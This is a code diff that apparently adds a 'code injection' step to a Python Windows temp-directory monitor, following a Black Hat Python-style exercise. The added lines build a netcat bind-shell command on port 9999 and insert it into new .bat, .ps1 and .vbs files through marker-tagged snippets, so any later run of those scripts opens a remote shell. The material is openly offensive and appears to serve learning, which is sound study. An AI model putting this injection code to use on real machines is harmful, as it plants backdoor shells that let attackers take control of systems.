@@ -14,6 +14,18 @@ FILE_LIST_DIR = 0x0001
 # Dir list to monitor
 PATHS = ['C:\\WINDOWS\\Temp', tempfile.gettempdir()]
 
+# ⁡⁢⁢⁣Code injection component⁡
+# pyintaller -F netcat.py <must be done prior>
+NETCAT = 'ch2_BasicNetworkTools\\netcat.exe'
+TGT_IP = '192.168.1.208'
+CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c'
+
+FILE_TYPES = { # Code snipets based on file extension
+    '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'],
+    '.ps1': ["\r\n#bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
+    '.vbs': ["\r\n'behpmarker\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n']
+}
+
 def monitor(path_to_watch):
     h_dir = win32file.CreateFile(
         path_to_watch,
@@ -70,7 +82,8 @@ if __name__ == '__main__':
         monitor_thread = threading.Thread(target=monitor, args=(path,))
         monitor_thread.start()
 
-# 𝗧𝗲𝘀𝘁:
+# 𝗧𝗲𝘀𝘁 - 𝗕𝗲𝗳𝗼𝗿𝗲 𝗰𝗼𝗱𝗲 𝗶𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻:
+#
 # C:\Users\User>cd C:\Windows\temp
 # C:\Windows\Temp>echo hello > fileTest.bat
 # C:\Windows\Temp>rename filetest.bat file2test
